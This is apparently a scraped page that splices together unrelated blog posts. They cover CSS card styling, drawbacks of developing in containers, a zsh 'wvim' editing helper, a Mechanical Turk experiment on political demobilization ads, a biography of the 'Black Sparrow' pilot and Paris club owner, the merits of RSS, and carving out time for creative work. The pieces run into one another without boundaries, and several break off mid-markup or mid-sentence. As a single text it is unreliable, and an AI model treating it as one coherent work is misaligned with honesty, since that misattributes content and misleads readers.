            <p><code>--block-shadow-color</code> is the fill color of the shadow</p>
        </li>
    </ul>

    <p>Here's a more colorful palette, by changing the <code>--block-accent-color</code> within just this div.</p>

    <div>
        

        <div>
            <h2>This is a blocky card</h2>
            <p>... that contains many other elements</p>
            </div>

    </div>

    <p>This is a dark theme, made possible by setting the text, background, and shadow colors to be their inverses.</p>

    <div>
        

        <div>
            <h2>This is a blocky card</h2>
            <p>... that contains many other elements</p>
            </div>

  <article>
    

    <p><strong>Monday, February  1, 2021</strong></p>

    <p>It seems like everyone these days is developing in containers. Specifically, I mean running your local development environment almost entirely in containers. There's a lot to be said for it, especially when you're bringing new developers into a project: it can be an invaluable way for anyone new to the project to quickly get all the tooling set up with a lot fewer "works on my machine" issues. But everything involves tradeoffs, so today we're going to focus on what some of the drawbacks of containers are. Also because it's my blog, so I write about what I want, dammit, and containers have been bugging me a little lately!</p>
<p>Here are some of the things that have been bugging me, and that make me just want to run processes directly on my host.</p>
<p><strong>Installing and managing packages takes extra work.</strong> Using Python as an example, it's pretty easy to get packages installed for any project that's using a modern dependency manager like <a href="https://python-poetry.org/">poetry</a> or <a href="https://pypi.org/project/pipenv/">pipenv</a>. You just run something like <code>poetry install</code> and it will setup a virtualenv for you (essential to have reproducible builds, isolated between projects). The tool is there, and you just use it, but you can wrap it in a Makefile for convenience if you like. But if you're using Docker, you get a lot of extra steps. For one, you have to make sure that the dependency manager's generated virtualenv is persisted on your host, not just in the container, else you will be reinstalling those dependencies every time you start a container. (Or you can install the dependencies into the <em>image</em>, but then you have to rebuild the entire image and install <em>every</em> dependency to just add one for testing something out, adding unnecessary friction.)</p>
<p><strong>Actually, everything takes extra commands.</strong> You want to install a new package? Oh, open a shell into your container, <em>then</em> install it. You want to compile your program? Open a shell into your container, <em>then</em> install it. You want to launch the development server? You guessed it... And yes, I know the pedantic comments are going to be "well, actually you can do this in one command with <code>docker run</code>"—okay, but that's not better: now you've just made the one command you need to run <em>far</em> longer.</p>
<p><strong>File permissions are a pain in the butt.</strong> If you have a directory mounted on the host and in the container (<code>node_modules</code>, for example) then in all likelihood the files created inside the container are going to be owned by <code>root</code> since everything runs as <code>root</code> by default. When you're your normal user outside the container, you now will have challenges doing things like deleting that directory—and it produces a lot of really noisy output when you use something like <code>grep</code>, because suddenly there are a lot of files you cannot read! There are solutions to this, making the container use the same userid as your user on the system, but I have not found anything that worked well. It's just not worth the effort, and you're left with a nuisance every time you generate files inside a container.</p>
<p><strong>Retaining history is difficult.</strong> Getting your bash history retained between containers is a challenge, but I understand it's doable. Now you use a Python shell, so you need to configure that one for history as well.  Then you start using Elixir, so you need to configure history for it as well. Everything that normally works out of the box when you're developing on your host directly? You have to configure it and figure out which files you need to share between containers and the host to make it work. You usually figure this out by the pain of <em>not</em> having the history, and eventually someone on the team will patch it to make it work (mostly). But... at what cost? You get this for free by just, you know, using the host.</p>
<p><strong>Performance is horrible on Macs.</strong> I use Linux as my only operating system (Ubuntu specifically), but many colleagues past and present prefer using Macs. With the latest hardware advances from Apple, this is going to hold true going forward. And yet the performance is tangibly worse for Docker on Macs, because you have to run it inside a VM. (Windows cleverly skirts this problem by running the Linux kernel directly, not inside a VM; Mac OS could certainly take a similar approach in the future, if they prioritize developer experience. I am not optimistic.)</p>
<p><strong>Integration with tooling isn't great.</strong> We've had a tough time at <a href="https://remesh.ai/">work</a> getting IDEs like PyCharm or VS Code to play nice with our containerized setup. They support containers, but they don't seem to support containerized monorepos very well. Or that's what I've seen from the problems my colleagues have run into. I've fiddled with it a bit. As a vim user, it doesn't affect me personally, but it is a big issue when considering the impact on the team at large.</p>
<p>So, yeah, containers are pretty great. I'm glad we have them, and I <em>love</em> having them for use in production environments. But locally? Most of the time, I think you're better off running what you're developing directly on your local machine. You get a robust, easy-to-use setup that doesn't throw away a lot of the features you get for free (history!). There are benefits to either approach, but the old tried-and-true methods deserve some love.</p>

<![CDATA[Wvim: Quickly edit shell scripts, aliases, and functions]]>
            </title>

February 3, 2021 | https://ctoomey.com/writing/which-plus-vim-wvim | <a href="https://web.archive.org/web/*/https://ctoomey.com/writing/which-plus-vim-wvim">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        
  <p>Over the years I’ve collected an array of one-off scripts, shell aliases, git
subcommands, etc., and I often find myself wanting to reference or edit of one
of them. Sometimes I know where to look, but not always, and when in doubt I
rely on the <code>which</code> command to point me in the right direction.</p>

<p><code>wvim</code> is a script that I’ve built to streamline these sort of edits. It started
as a simple wrapper around <code>which</code> — <code>function wvim() { vim "$(which $1)" }</code> —
but over time I’ve added support for shell functions &amp; aliases, as well as git
aliases and scripts. The thing that tipped this into the “oh wow, that’s pretty
cool” space for me was the addition of tab completion by leveraging the existing
tab completion for <code>which</code> via <code>compdef wvim=which</code>.</p>

<p>Using it looks something like this:</p>

<video autoplay="" loop="" muted="" playsinline="" controls="" src="https://d33wubrfki0l68.cloudfront.net/72f38f70e9318ad832a3a3d083ff721193825df2/e9a66/assets/videos/wvim.mp4">
</video>

<h2 id="show-me-the-code">Show Me The Code!</h2>

<p>You can check out <a href="https://github.com/christoomey/dotfiles/blob/master/zsh/configs/wvim.zsh">my current version of this script in my dotfiles
repo</a>,
but for completeness, I’ve included the contents of the file below. You can use
it by including the code in your <code>~/.zshrc</code> file (or by splitting it out into
its own file for organization purposes if you share my penchant for clean config
files).</p>

<p><em>Note</em> - the <code>compdef</code> completion line is zsh-specific, but I believe the rest
should be reasonably portable to bash or other similar shells.</p>

<p>Given that <code>wvim</code> is built out of various regex checks and heuristic searching
logic, I’ve been impressed by how well <code>wvim</code> has worked for me.</p>

<p>That said, there are a few assumptions baked into this script, most notably that
I have it configured to look in both <code>~/.zshenv</code> and <code>~/.zshrc</code>. If you don’t
have both those files, you’ll want to update that to only reference the file you
have.</p>

</div><div><p>It’s hard to measure the effectiveness of political ads because the goal is to change&nbsp;<em>offline</em>&nbsp;behavior, which means all those cookies that Facebook stuffs into your browser count for nothing.</p>
<p>Since there’s no way to track conversion (i.e. how many people vote for your team) many political campaigns try using&nbsp;<em>recall</em>&nbsp;to measure to effectiveness of an ad.&nbsp;<em>Recall</em> is the percentage of people who will remember seeing an ad from your campaign two days later<span><a onclick="footnote_moveToAnchor_1_2('footnote_plugin_reference_1_2_6');"><sup id="footnote_plugin_tooltip_1_2_6">[6]</sup></a><span id="footnote_plugin_tooltip_text_1_2_6">Facebook&nbsp;<a href="https://www.facebook.com/business/help/1029827880390718?id=429023050853196">actually says</a> “within two days” which is hilariously imprecise.</span></span><sup id="fnref2"></sup>, and&nbsp;<em>recall lift</em>&nbsp;is the difference in recall between people who have seen your ad and people who haven’t.</p>

<p>The other common way of measuring the efficacy of a political ad to use some other behavior as a proxy for voting. Maybe if someone eventually donates to your campaign (or Super PAC or whatever), that’s a sign that your ad is working! Maybe if they just&nbsp;<em>click</em>&nbsp;on your ad, that’s a good sign!</p>
<p>I dunno maybe? It seems pretty unscientific. I actually click on lots of crazy Trump ads because I’m curious who’s paying for them.<span><a onclick="footnote_moveToAnchor_1_2('footnote_plugin_reference_1_2_7');"><sup id="footnote_plugin_tooltip_1_2_7">[7]</sup></a><span id="footnote_plugin_tooltip_text_1_2_7">And (spoiler) I did not vote for the Trumpster.</span></span> And if you’re trying to persuade <em>undecided</em>&nbsp;voters who to vote for, it’s pretty unlikely they’re going to go from “I don’t know who to vote for” to “OMG TAKE MY MONEY!”</p>
<p>But here’s a crazy idea: what if we showed people ads <strong>and then just&nbsp;asked&nbsp;who they planned to vote for?</strong></p>
</div><div><p><a href="https://www.mturk.com/">Mechanical Turk</a> is a marketplace for extremely small, web-based tasks. The tasks (called Human Intelligence Tasks or HITs) are usually just an HTML form, possibly with some links to external media. <a href="https://www.pewresearch.org/internet/2016/07/11/the-requesters-a-mix-of-academics-and-businesses/">Common Mechanical Turk tasks</a> include:</p>
<ul>
<li>Identifying objects in images (usually for ML training)</li>
<li>Transcription (i.e., from audio to text)</li>
<li>Surveys (either academic- or marketing-related)</li>
</ul>
<p><a href="https://journals.sagepub.com/doi/abs/10.1177/1745691610393980">Several</a> <a href="https://papers.ssrn.com/sol3/papers.cfm?abstract-id=1626226">studies</a> <a href="https://dl.acm.org/doi/abs/10.1145/1357054.1357127">attest</a> that Mechanical Turk can provide survey responses that match or exceed the quality of traditionally-administered surveys. And—most importantly for the 2020 election—you can do it without actually <em>talking</em> to anyone!</p>
</div><div><p>In a past life <a href="https://tjcx.me/p/i-wasted-40k-on-a-fantastic-startup-idea">I read a lot of randomized controlled trials</a>. I might not be a scientist but I can definitely play one on <del>TV</del> this blog. So here’s what I’m thinking, design-wise:</p>
<ol>
<li>Find all the (self-identified) conservatives on Mechanical Turk</li>
<li>Split them into two groups
<ol>
<li>The&nbsp;<strong>control group</strong>
<ol>
<li>Who gets to look at a cute dog</li>
</ol>
</li>
<li>and the&nbsp;<strong>experimental group</strong>
<ol>
<li>Who sadly must look at a political ad</li>
</ol>
</li>
</ol>
</li>
<li>Then we ask them “hey there voter, who are you voting for?”</li>
<li>Compare the groups and see which (if any) of your ads worked</li>
</ol>
<p>Basic science, right?<span><a onclick="footnote_moveToAnchor_1_2('footnote_plugin_reference_1_2_8');"><sup id="footnote_plugin_tooltip_1_2_8">[8]</sup></a><span id="footnote_plugin_tooltip_text_1_2_8">It’s also (I think?) the basic strategy used by Civis Analytics, based on this <a href="https://medium.com/civis-analytics/with-message-testing-popularity-does-not-equal-persuasiveness-2da200ecc3a8">extremely vague Medium article</a> I read.</span></span> It’s not quite double-blind (most subjects are <em>aware</em> that they’re looking at a pro-Biden ad) but as social science experiments go it’s not bad.</p>
</div><div><h3>What’s the point of all this?</h3></div><div><p>I used to think that all political ads had a single goal:&nbsp;<em>convincing people on the other team to vote for your team.</em></p>
<p>But it turns out these “persuasion” ads don’t really work. A <a href="https://papers.ssrn.com/sol3/papers.cfm?abstract_id=3042867">2017 review</a> of 40 field experiments concluded that “the best estimate of the effects of campaign contact and advertising on Americans’ candidates choices in general elections is zero.” So why run ads at all?</p>
<p>Well persuasion ads are only one type of political ad. The full list is</p>
<ol>
<li><strong>Mobilization ads,</strong> which encourage people on your team to get off their asses and vote</li>
<li><strong>Demobilization ads,</strong> which encourage people on the <em>other</em> team to stay home</li>
<li><strong>Persuasion ads,</strong> which convince independent voters that they should vote for you team</li>
</ol>
<p>In other words, changing minds is hard, but convincing people to (1) get off or (2) stay on the couch is relatively easy.</p>
<p>Mobilization ads are pretty common. The phonebanking that I so desperately tried to avoid was&nbsp;<em>entirely</em> about mobilization—we only called “lean left” voters and made sure they knew how to get to their polling place. You may have also heard this called “Get out the vote,” “GOTV,” or even “Get off your festering, bedridden ass and do your civic duty.”<span><a onclick="footnote_moveToAnchor_1_2('footnote_plugin_reference_1_2_9');"><sup id="footnote_plugin_tooltip_1_2_9">[9]</sup></a><span id="footnote_plugin_tooltip_text_1_2_9">Depending on how many consecutive hours of phonebanking I’ve done.</span></span> This tends to work pretty well, since one-third of Americans don’t vote in general elections.<span><a onclick="footnote_moveToAnchor_1_2('footnote_plugin_reference_1_2_10');"><sup id="footnote_plugin_tooltip_1_2_10">[10]</sup></a><span id="footnote_plugin_tooltip_text_1_2_10">Although the 2020 election did have <a href="https://www.washingtonpost.com/graphics/2020/elections/voter-turnout/">record turnout</a>.</span></span></p>
<p>A quick perusal of the <a href="https://www.facebook.com/ads/library">Facebook Ad Library</a> tells me that both sides have the mobilization part covered. That means <em>mobilization</em> is saturated and <em>persuasion</em> doesn’t work—which leaves the dark art of <em>demobilization:&nbsp;</em><strong>how can I best convince conservatives to <em>not</em> vote for Trump?</strong></p>
</div><div><p>I’m not Don Draper, but since I have two eyeballs and an internet connection I see roughly 8,156 ads every second—I should be able to&nbsp;<em>make</em> the damn things, right?</p>
<p>Well okay here’s what I came up with:</p>
</div></div></div><div id="the-ads"><div><div><p>The ads compared in this study. Click to enlarge.</p>
</div></div></div><div><div><div><p>I wanted to try positive&nbsp;<em>and</em> negative ads, and I wanted to try a few different issues. Can already guess which ads worked?</p>
</div><div><p>Anyway, after displaying one of these ads to a Turker<span><a onclick="footnote_moveToAnchor_1_2('footnote_plugin_reference_1_2_11');"><sup id="footnote_plugin_tooltip_1_2_11">[11]</sup></a><span id="footnote_plugin_tooltip_text_1_2_11">I’m told this isn’t as pejorative as it sounds.</span></span> I ask them two questions.

</div></div></div><div><div><div><p>In addition to this question, I also asked an <a href="https://www.cloudresearch.com/resources/blog/attention-check-questions-in-surveys-examples/"><strong>attention-check question</strong></a> (ACQ). The ACQ varied for each treatment group, but it looked something like this:</p>
</div></div></div><div><div><div><span><img width="1460" height="356" alt="Screenshot of attention check question" title="attention-check" src="https://anthemlabs.org/wp-content/uploads/2020/12/Screen-Shot-2021-01-23-at-5.06.19-PM.png" srcset="https://anthemlabs.org/wp-content/uploads/2020/12/Screen-Shot-2021-01-23-at-5.06.19-PM-200x49.png 200w, https://anthemlabs.org/wp-content/uploads/2020/12/Screen-Shot-2021-01-23-at-5.06.19-PM-400x98.png 400w, https://anthemlabs.org/wp-content/uploads/2020/12/Screen-Shot-2021-01-23-at-5.06.19-PM-600x146.png 600w, https://anthemlabs.org/wp-content/uploads/2020/12/Screen-Shot-2021-01-23-at-5.06.19-PM-800x195.png 800w, https://anthemlabs.org/wp-content/uploads/2020/12/Screen-Shot-2021-01-23-at-5.06.19-PM-1200x293.png 1200w, https://anthemlabs.org/wp-content/uploads/2020/12/Screen-Shot-2021-01-23-at-5.06.19-PM.png 1460w" sizes="(max-width: 640px) 100vw, 1200px"></span></div><div><p>One of my attention-check questions (ACQs).</p>
</div></div></div><div><div><div><p>Basically, Turkers are incentivized to complete as many tasks as possible in the shortest amount of time. I’m not saying that Turkers are <em>intentionally</em> filling out random answers to surveys, but I&nbsp;<em>am</em> saying that the incentives aren’t great. To combat the inattentive Turker I’ve added this second question, which asks Turkers something painfully obvious about the ad I’ve just showed them.<span><a onclick="footnote_moveToAnchor_1_2('footnote_plugin_reference_1_2_12');"><sup id="footnote_plugin_tooltip_1_2_12">[12]</sup></a><span id="footnote_plugin_tooltip_text_1_2_12">After I ran this study I found some evidence that <a href="https://www.pewresearch.org/methods/2020/02/18/two-common-checks-fail-to-catch-most-bogus-cases/">open-ended questions make&nbsp;<em>much</em> better ACQs</a>—something to try next time!</span></span></p>
<p>I threw out 1% of the responses because they got this question wrong.</p>
</div><div><p>I don’t want any schmuck with an internet connection to fill out this survey. There are&nbsp;<em>rules</em>, you know? My respondents should</p>
<ul>
<li>Be conservative (I’m studying the demobilization of&nbsp;<em>conservatives</em>)</li>
<li>Live in the US<span><a onclick="footnote_moveToAnchor_1_2('footnote_plugin_reference_1_2_13');"><sup id="footnote_plugin_tooltip_1_2_13">[13]</sup></a><span id="footnote_plugin_tooltip_text_1_2_13">Well okay I want them to be eligible to vote in US federal elections but “location” is a good enough proxy.</span></span></li>
<li>Not have filled out another survey in this study</li>
</ul>
<p>Anyway Mechanical Turk makes enforcing these rules pretty easy via&nbsp;<em>Worker Qualifications</em>:</p>

</div></div></div><div><div><div id="worker-qualifications">
<p>Easy, right? But before you start piling on qualifications like Yogurtland toppings, let me remind you that many of these are “premium” qualifications and cost an arm and leg. If you don’t want to be one of those schmucks that <a href="https://www.delish.com/food-news/news/a53666/best-frozen-yogurt-toppings-for-your-money/">wastes money on fruit at Yogurtland</a>, <strong>consider asking your own screening questions.</strong></p>
<p>The downside of asking your own screening questions is that you’ll have to throw out all the answers from people who don’t meet your criteria. But depending on the cost of the qualification and the estimated percentage of people who will pass the screening question, it might make financial sense to do it yourself.</p>
<p>Ready to be dazzled by some complicated math? Here’s the cost of using your own screening questions<span><a onclick="footnote_moveToAnchor_1_2('footnote_plugin_reference_1_2_14');"><sup id="footnote_plugin_tooltip_1_2_14">[14]</sup></a><span id="footnote_plugin_tooltip_text_1_2_14">Assuming the <a href="https://en.wikipedia.org/wiki/Axiom_of_choice">Axiom of Choice</a></span></span>:</p>
<p>\[\text{requirement cost} = \frac{1-p}{p}c\]</p>
<p>Where \(p\) is the estimated proportion of Turkers that will pass your qualification, and \(c\) is the total cost for each completed HIT. In my case each task cost $0.46 ($0.33 for Turkers and $0.13 for Amazon), and according to a <a href="https://journals.sagepub.com/doi/pdf/10.1177/2158244016636433">2016 study</a> of the Mechanical Turk population is roughly 14.6% capital-R Republican<span><a onclick="footnote_moveToAnchor_1_2('footnote_plugin_reference_1_2_15');"><sup id="footnote_plugin_tooltip_1_2_15">[15]</sup></a><span id="footnote_plugin_tooltip_text_1_2_15">Wild, right?</span></span>, so the “roll-your-own” screening method would cost</p>
<p>\[\text{requirement cost} = \frac{1-0.146}{0.146}0.46 = $2.69\]</p>
<p>Which is&nbsp;<em>far</em> more than <a href="https://requester.mturk.com/pricing">the $0.40 that Amazon charges</a> for the “US Political Affiliation” premium qualification—so that’s what I used.</p>

		<div>
			<div>
<p>They called him the Black Sparrow, and from the beginning of his life, all he wanted to do was get to France.</p>
</div>
<div>
<p>He was born in Georgia, his father a former slave from Haiti, his mother full-blooded Creek. He ran away while still a child, determined to fulfill his destiny.</p>

</div>
<div>
<p>He lived for a time with a group of English Romani, learning the art of horsemanship and working as a jockey. He kept traveling and working until he made his way to Norfolk, where he stowed away on a ship bound for Scotland.</p>
</div>
<div>
<p>He wouldn’t see America again for thirty years.</p>

</div>
<div>
<p>In Glasgow he got work as a lookout for gambling operators, saving money until he had enough to get to England: one country closer to his goal. In Liverpool he did hard labor until his muscles developed and he turned to boxing.</p>
</div>
<div>
<p>He became part of a whole expat community of Black boxers — some of the finest fighters in history — who had fled to Europe to find opportunities denied them in the States. Soon he was fighting regularly as a welterweight, racking up an impressive record, even fighting on the undercard of a few Jack Johnson bouts.</p>
</div>
<div>
<p>His boxing career earned him a decent amount of money, and eventually took him to Paris, where he won his bout and promptly hopped off the tour.</p>
</div>

<div>
<p>Imagine, if you will, being a young, handsome Black/Creek man, son of a slave, escaped from the American South, newly arrived in Paris in the springtime with your own apartment and a pocketful of money.</p>
</div>

<div>
<p>Fighting for France was a no-brainer. After all, in his heart at least, it was his country. He joined the French Foreign Legion, training to fight in the 3rd Marching Division alongside wealthy Ivy Leaguers, mariners, farmers, doctors, executives, refugees, cooks, and plenty of characters from all over the world running from undisclosed situations. These were Belgians, Italians, Russians, Greeks, Americans, a handful of Black Americans; Muslims, Catholics, Jews and Protestants — the legendary rabble of the Legion.</p>

</div>
<div>
<p>Sent directly to the front along the Somme, he was thrust into a world of filthy, bloody trenches still filled with the body parts of the dead and the rancid smell of shit and blood as his unit experienced some of the worst losses of the war.</p>
</div>
<div>
<p>At the end of this stint, what was left of the 3rd was disbanded and he had only the briefest respite before he joined the 170th Cavalry and was sent straight to Verdun to participate in what would become one of the worst battles in the history of the human race.</p>
</div>
<div>
<p>Now a corporal, he led a machine-gun crew and again was front-and-center for the worst of the fighting, suffering first a shrapnel wound to the face that he simply fought through, then finally sidelined by a massive, nearly fatal wound to his thigh that finally sent him away from the front.</p>

</div>
<div>
<p>Decorated with the Croix de Guerre for his valor at Verdun — one of France’s highest military honors — he was well within his rights to find a desk job in the military.</p>
</div>
<div>
<p>He had other ideas. He wanted to fly.</p>
</div>
<div>
<p>Already viewed as a hero, he was able to pull the necessary strings to enter flight school, and became the first Black American fighter pilot in history.</p>
</div>
<div>
<p>He flew a SPAD VII C1 with a distinctive alteration to its appearance. Painted on the outside of the fuselage was a red heart with a dagger through it. Above the heart was his personal slogan, one he would later use for the title of his unpublished memoir: Tout Le Sang Qui Coule Est Rouge; roughly, in English: “All Blood Runs Red.”</p>
</div>
<div>
<p>He flew with honor and distinction until his career in the air came to an abrupt halt. The Americans had entered the war and the involvement of a certain Dr. Gros, a US Army Major with racist attitudes, led to the end of the Black Sparrow’s career as a pilot.</p>

</div>
<div>
<p>But the French continued to celebrate him. He ended this part of his military career with the Military Medal, Croix de Guerre, Volunteer Combat Cross, Medal for Military Wounded (twice), World War I Medal, Victory Medal, Voluntary Enlistment Medal, Battle of Verdun Medal, Battle of Somme Medal, and the American Volunteer with the French Army Medal.</p>
</div>
<div>
<p>And that is when his life got interesting.</p>

</div>
<div>
<p>The Great War over, he found himself in Paris in the 1920s at the onset of the Jazz Age. He got back in shape, took work as a sparring partner and fought a few more times. But it wasn’t sustainable with his injuries.</p>
</div>
<div>
<p>So he learned to play the drums and became a jazz musician. He gigged frequently, saved money, and ended up in a business partnership with a biracial American blues singer whose birth name was Ada Beatrice Queen Victoria Louis Virginia Smith — known as “Bricktop” for her red hair.</p>

</div>
<div>
<p>Together, they opened the Le Grand Duc, and thus he became proprietor of the hippest nightclub in the hippest city during the birth of hip.</p>
</div>
<div>
<p>He got married around this time to a Frenchwoman named Marcelle and they had two daughters. For reasons that remained private, Marcelle ended up leaving him with their children, to whom he would remain devoted for the rest of his life, as we will see.</p>
</div>
<div>
<p>But he had to balance the duties of being a single parent with Le Grand Duc — and later his other club, L’escradille, which was connected to a boxing gym so that patrons could party, then exercise, take a steam bath, get a massage, and start partying again.</p>
</div>
<div>
<p>To name the personages that frequented his clubs is basically to list the greatest names in art and culture in the renaissance that was the 1920s.</p>

</div>
<div>
<p>Langston Hughes was a busboy and dishwasher. Arthur Wilson — you may know him as “Sam” of Casablanca fame — was part of the house band. Charlie Chaplin was a favorite. Gloria Swanson. Fatty Arbuckle. The Prince of Wales. Staff would move tables when Fred and Adele Astaire came in to tear up the floor. Picasso would stop by, and Hemingway was there often enough that he wrote about it in “The Sun Also Rises.” Josephine Baker could not be missed, and even babysat for the Sparrow. F. Scott Fitzgerald and Zelda were frequent, notorious guests. Cole Porter would come in; he adored the way Bricktop interpreted his songs. When Louis Armstrong encamped in Paris, he and the Sparrow became close.</p>
</div>
<div>
<p>But the good times couldn’t last. In 1933, Hitler was appointed Chancellor of Germany. In France, the Deuxième Bureau was created as a counter-intelligence service and the Sparrow was recruited to work with the beautiful Alsatian spy, Cleopatre “Kitty” Terrier, whose father’s murder by Germans in the disputed border region had instilled in her a lifelong hatred of German expansionism.</p>

</div>
<div>
<p>Kitty and the Sparrow worked as a team at the club. He would serve tables and play dumb, exploiting German prejudices that would never suspect he was fluent in German. She would flirt her way into privileged information. It was a highly successful (and probably romantic) pairing, but with rationing, blackouts, and other wartime austerity measures, keeping businesses running became harder and harder.</p>

</div>
<div>
<p>He tried. He procured a wagon and would visit markets at the end of the day for discounted goods, throw them in a stew at the club. Come evening he would feed everyone for free, plus a free glass of wine per person and a pack of cigarettes per table. He tried. But of course, things got worse.</p>
</div>
<div>
<p>He pulled his daughters out of their convent school to keep them close. Closed the club. Many were fleeing as the Nazis came storming through Belgium. He wouldn’t run.</p>
</div>
<div>
<p>He continued to work with Kitty in the Resistance until 1940, when the Nazis marched down Champs-Élysées and through L’arc de Triomphe.</p>

</div>
<div>
<p>Tens of thousands fled the city only to be bombed from the skies. He left his daughters in the care of Kitty, who promised to do what was necessary to keep them safe, packed his gear, and headed for the frontlines, determined, despite his age and multiple injuries, to find his old unit and rejoin the Legion.</p>
</div>
<div>
<p>When he arrived, it was only to find that his unit had been destroyed. Returning to Paris, he couldn’t enter; it had been completely overrun.</p>

</div>
<div>
<p>But he heard rumors that the French 51st was holding out at Orléans. He started off on foot. The roads were full of starved, half-mad refugees. Bombings were frequent.</p>
</div>
<div>
<p>When he got there he discovered that his lieutenant from the last war was the commander of the 51st, and, in what must have felt like the world’s worst case of déjà vu, he was once again in charge of a machine-gun crew, fighting the Germans.</p>
</div>
<div>
<p>He fought with his usual bravery. But it was a hopeless last stand. A shell that killed 11 men threw him forty feet and cracked a vertebrae.</p>

</div>
<div>
<p>His fighting days were over. Using his rifle as a crutch, he struck out for a military hospital in Angoulême, trying to stay out of sight.</p>
</div>
<div>
<p>But there was little they could do for him there: painkillers, some bandages, and a few cans of sardines with a suggestion to head for Bordeaux and into Spain which, although Fascist, had maintained official neutrality, and was tacitly allowing Allied rescue efforts on Spanish soil.</p>
</div>
<div>
<p>He made it, somehow, received his first passport, and was put on a Navy ship to finally return to the United States he had fled decades before.</p>

</div>
<div>
<p>Life in Manhattan wasn’t easy. He had to start from scratch. He worked odd jobs — longshoreman, salesman of French perfume. Through a contact in the State Department he was able to get in touch with Kitty, who was true to her word: his daughters were safe. They came to the States without a word of English between them and moved in with their beloved father in Spanish Harlem.</p>

</div>
<div>
<p>He became involved in Free French groups, working to support General de Gaulle, head of the Free French government in exile, and was also filmed getting beaten by police as part of a human chain to protect Paul Robeson when his concert was disrupted by white supremacists.</p>
</div>
<div>
<p>Times were tight but he was doing okay. His old friend Louis Armstrong came to help, hiring him as a tour manager and occasional drummer. He even tried to recover his club and gym in …</p></div></div></div></div>

<h2 id="Marc%20on%202021-02-03">Marc on 2021-02-03</h2>

<p>I firmly believe the Internet, and what it stood for, peaked with RSS. </p>

<p>RSS, or <a href="https://en.wikipedia.org/wiki/RSS">Really-Simple-Syndication</a>, is (or <em>was</em> depending on your viewpoint) a means of allowing basically anything online to be collated into a single feed. You would visit the websites you loved, add their RSS feed to your preferred reader, and from then on be instantly notified of any new content, it was as simple as that. RSS primarily had its heyday during the Web 2.0 era (circa 1999-2010) when the freedom to do whatever you wanted with the information present on the Web was really the driving force behind a lot of new features and systems. This was of course before Social Media had taken off in the way we know it today and most of these concepts were siloed off into their own locked-down social-feeds.</p>

<p>Once Social-Media took its hold on the Web if there was something/someone you wanted to follow online you just added them to your Twitter feed or subscribed on YouTube; a fine idea until you decide you don't like the layout of the site in question or an algorithm decides you don't need to see the work of those you care about as often as you want (aka the <em>curated</em> timeline). I've already spoken before about my <a href="https://atthis.link/blog/2020/mastodon.html">general disinterest with Social Media</a> but it wasn't until somewhat recently that I decided to really start looking for alternatives - searching for a better way to interact with the Internet. I found my answer in RSS. I enjoyed the freedom to see sources as I wanted, the flexibility to move to a new reader if I wanted, the complete lack of advertising. It was hard to not fall in love with the service.</p>

<p>However it wasn't until I began working from home and everything in my life moved online that I really began to notice how beneficial RSS could be with relation to Digital Wellbeing. By selecting only the sites, blogs, creators etc. that I had a serious interest in, I could effectively remove the negative effects of social media and excessive online usage from my life. It was easier to get involved in serious <a href="https://atthis.link/blog/2020/deepwork.html">Deep Work</a> as I had no social feeds to endlessly scroll through. It was easier to stay informed as I could only see the <em>latest</em> items rather than being given an algorithmic infinite feed of supposedly “breaking news.” I could open my reader maybe twice a day, skim through the latest items and continue on with my work, a process that could be over and done with in under 5 minutes - a far cry from opening Twitter and suddenly 2 hours have passed…</p>

<p>Another use-case I was surprised to develop was managing collaborative projects. An issue I've heard repeatedly from those working from home is that of being deafened by the ever-present, ever-ringing notification-bell as countless chat and collaboration apps incessantly vie for your attention with new questions, comments, and discussions that may-or-may-not need your already splintered focus. For me, RSS solved that issue. Instead of checking-in every 10 minutes to see if there's any new project developments, or sending chaser messages asking if a colleague finished up on that feature - I can just track everything with RSS. If anything comes up that I need to know about, RSS will be there to present it to me.</p>

<p>As I said during the introduction of this post, RSS may appear to some to have fallen by the wayside as content is increasingly siloed into only being available on a specific platform. However a not insignificant number of sites still make the service readily available, for instance:</p>

<ul>
<li><p><a href="https://www.reddit.com/wiki/rss">Reddit still offers RSS support</a> by appending <code>/.rss</code> to the end of a given URL.</p></li>
<li><p>GitHub allows you to add an activity feed of your followed accounts/organisations by clicking the feed icon at the bottom of your account page.</p></li>
<li><p>YouTube offers RSS support by adding a channel ID (The series of numbers and characters present in the URL of a channel homepage) to the following URL:</p></li>
</ul>

<pre><code>www.youtube.com/feeds/videos.xml?channel_id=CHANNEL_ID
</code></pre>

<p>Having only the content I want to see only be shown when I want to see it with the freedom to jump between readers as I please, all with no ads? For me, no other service comes close to the flexibility, robustness, and overall ease-of-use that RSS offers.</p>

<p>Its heyday may be over but RSS is still very much alive with services like <a href="https://feedly.com/">Feedly</a> and <a href="https://newsboat.org/">Newsboat</a> (recommended) along with a host of mobile apps on either platform letting you experience the web at what I consider to be its best. If you feel like trying out RSS for yourself, why not get started by adding <a href="https://atthis.link/rss.xml">this blog</a> to your reader?</p>

<blockquote>
<p><strong>You can’t hold a gun to someone’s head and say “Be Creative.”</strong> -Mike Booth, creator of Left4Dead</p>
</blockquote>
<p>The best PM’s don’t come up with creative ideas and strategy all the time. They create space for creative thinking and optimize their process.</p>
<p>It feels like the stars have to align. The right environment, the right mood, the right spark of inspiration. Now throw a global pandemic on top of that where everyone is working from their bedrooms (or at least I am). There are constant distractions, more meetings than ever, and my typical tools like whiteboards and walking 1:1’s are out the window.</p>
<p>You can call it ‘in the zone’ or ‘flow state’ or ‘creative mode’ but whatever it was... I wasn’t hitting it.</p>
<p>Last month, I found myself sitting around for hours unable to focus and make any progress on strategy or vision.</p>
<p><strong>I was really struggling.</strong></p>
<p>Since then, I’ve started to crack a formula to enter creative mode. It hasn’t been a single epiphany or a magic incantation, but rather a series of behavior changes.</p>
<h2><strong>Schedule</strong></h2>
<p>Creative thinking takes time. You can’t just flip your brain into creative mode instantly. On a good day, it takes about 15 minutes for me to enter creative mode. On a bad day, it can take hours. <strong>If you’re always in meetings with 30 minute chunks in between, you’ll never make any progress.</strong></p>
<p>Instead, we want to optimize for large, uninterrupted focus blocks. Think of The Matrix. When Keanu is interrupted IRL, everything in his brain falls apart. Your brain works the same way. You have to boot the entire project up in your brain, hold it there, and manipulate it.</p>
<img src="https://bdickason.com/static/posts/unlock-creative-strategic-thinking/soul.jpg">
<p>In the movie Soul, flow is an alternate plane of existence.</p>
<p><strong>Select days for creative thinking</strong> - If you aren’t intentional, meetings will crowd your time and create sprawl all over your calendar. Select at least two days where you optimize your schedule for creative thinking. This will allow you to remember (and have a rationale) to defend those days. I like to setup my calendar as follows:</p>
<ul>
<li>Monday - 1:1’s</li>
